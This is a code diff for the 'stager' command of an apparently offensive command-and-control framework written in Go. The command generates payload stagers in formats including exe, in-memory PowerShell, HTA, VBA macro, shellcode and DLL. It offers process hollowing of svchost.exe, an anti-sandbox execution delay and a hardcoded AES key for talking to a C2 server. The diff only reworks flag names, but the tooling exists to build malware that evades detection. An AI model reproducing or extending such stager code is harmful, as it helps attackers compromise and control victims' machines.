@@ -35,24 +35,30 @@ var stagerCmd = &cobra.Command{
 }
 
 func init() {
-	stagerCmd.Flags().String("c2", "http://127.0.0.1:8080", "C2 base URL")
-	stagerCmd.Flags().String("token", "", "Stage token (required)")
-	stagerCmd.Flags().String("key", "SpookyOrcaC2AES1", "AES encryption key")
-	stagerCmd.Flags().String("method", "thread", "Execution method: thread|hollow|drop")
+	stagerCmd.Flags().String("server", "http://127.0.0.1:8080", "C2 server URL")
+	stagerCmd.Flags().String("c2", "", "C2 server URL (alias for --server)")  // backwards compat
+	stagerCmd.Flags().String("token", "", "Stage token (required — from 'stage upload')")
+	stagerCmd.Flags().String("key", "SpookyOrcaC2AES1", "AES encryption key (must match server ENCRYPTION_KEY)")
+	stagerCmd.Flags().String("exec-method", "drop", "Execution method: drop|hollow|thread")
 	stagerCmd.Flags().String("hollow-exe", `C:\Windows\System32\svchost.exe`, "Hollow target process")
-	stagerCmd.Flags().String("format", "exe", "Output format: exe|ps1|ps1-mem|hta|vba|cs")
+	stagerCmd.Flags().String("format", "exe", "Output format: exe|ps1|ps1-mem|hta|vba|cs|shellcode|dll")
 	stagerCmd.Flags().String("arch", "amd64", "Target arch: amd64|x86")
-	stagerCmd.Flags().Int("jitter", 0, "Anti-sandbox sleep seconds before execution")
-	stagerCmd.Flags().String("output", "", "Output file path (default: stdout or auto-named)")
-	stagerCmd.Flags().Bool("no-strip", false, "Keep debug info (larger binary)")
+	stagerCmd.Flags().Int("jitter", 0, "Anti-sandbox delay seconds before execution")
+	stagerCmd.Flags().String("output", "", "Output file path (default: auto-named in current dir)")
+	stagerCmd.Flags().Bool("no-strip", false, "Keep debug symbols (larger binary)")
 	_ = stagerCmd.MarkFlagRequired("token")
 }
 
 func runStager(cmd *cobra.Command, _ []string) error {
-	c2, _ := cmd.Flags().GetString("c2")
+	server, _ := cmd.Flags().GetString("server")
+	c2alias, _ := cmd.Flags().GetString("c2")
+	if c2alias != "" {
+		server = c2alias // --c2 takes precedence if explicitly set
+	}
+	c2 := server
 	token, _ := cmd.Flags().GetString("token")
 	key, _ := cmd.Flags().GetString("key")
-	method, _ := cmd.Flags().GetString("method")
+	method, _ := cmd.Flags().GetString("exec-method")
 	hollowExe, _ := cmd.Flags().GetString("hollow-exe")
 	format, _ := cmd.Flags().GetString("format")
 	arch, _ := cmd.Flags().GetString("arch")
